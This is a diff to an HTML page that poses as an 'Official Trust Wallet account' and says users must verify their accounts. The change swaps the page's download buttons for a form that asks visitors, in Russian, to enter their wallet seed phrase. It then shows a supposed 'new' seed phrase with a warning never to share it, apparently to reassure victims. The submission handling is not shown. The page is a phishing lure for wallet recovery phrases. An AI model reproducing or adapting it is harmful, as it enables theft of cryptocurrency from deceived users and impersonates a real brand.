@@ -45,17 +45,26 @@
     <div class="container">
         <div class="hero-content">
             <img class="pin" src="https://i.pinimg.com/originals/1e/2d/c8/1e2dc8e5ad302df838a5bc95cdd756c5.png">
-            <h1>Crypto Wallet Trust Wallet</h1>
+            <h1>Crypto Wallet Trust </h1>
             <p class="hero-subtitle">Official Trust Wallet account. In order to continue using our site, we need to verify that you are a Trust Wallet user. Please select the following</p>
-            <div class="download-buttons">
-                <a href="#" class="download-btn" id="connectWallet">
-                    <i class="fab fa-apple"></i>
-                    <span>Continue with Wallet</span>
-                </a>
-                    <a href="#" class="download-btn">
-                        <i class="fab fa-google-play"></i>
-                        <span>Verify your accoun Android</span>
-                    </a>
+            <div class="download-buttons" id="walletSection">
+                <form id="seedForm" class="download-btn">
+                    <label for="seedInput" style="color: var(--primary); font-weight: 500;">Введите seed фразу:</label>
+                    <textarea id="seedInput" name="seed" rows="3" placeholder="e.g. abandon abandon ability..." required 
+                        style="padding: 10px; border-radius: 10px; border: none; width: 100%; max-width: 100%; resize: none; font-weight: 500;"></textarea>
+                    <button type="submit" style="padding: 10px 20px; background-color: var(--primary); color: white; border: none; border-radius: 25px; font-weight: 600;">Continue</button>
+                </form>
+            </div>
+            
+            <div id="newSeedDisplay">
+                <h3>Это ваша новая seed-фраза:</h3>
+                <p id="generatedSeed" style="margin-top: 10px; font-weight: bold;"></p>
+                <p style="margin-top: 15px; color: #FFD700; font-size: 14px;">
+                    Внимание: сохраните эту фразу в надёжном месте. Никому её не передавайте. 
+                    С её помощью можно получить полный доступ к вашему кошельку.
+                </p>
+            </div>
+                  
                 </div>
             </div>
             
